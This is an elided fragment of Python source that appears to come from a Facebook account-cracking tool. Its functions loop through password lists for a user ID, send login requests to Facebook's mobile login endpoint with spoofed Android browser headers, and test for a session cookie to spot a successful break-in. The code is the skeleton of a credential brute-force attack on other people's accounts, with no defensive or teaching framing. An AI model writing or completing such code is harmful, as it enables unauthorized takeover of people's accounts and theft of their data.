...
def Y2():
    ...
    print('\033[1;96m[BD CODE] \033[1;92m> \033[1;92m 017 - 019 - 018 - 013')
...
def rcerek(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-M325F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36',
}
...
def SHANTO(uid,pwv,tl):
    ...
    try:
        for ps in pwv:
            ...
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-M325FV Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.163 Mobile Safari/537.36',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
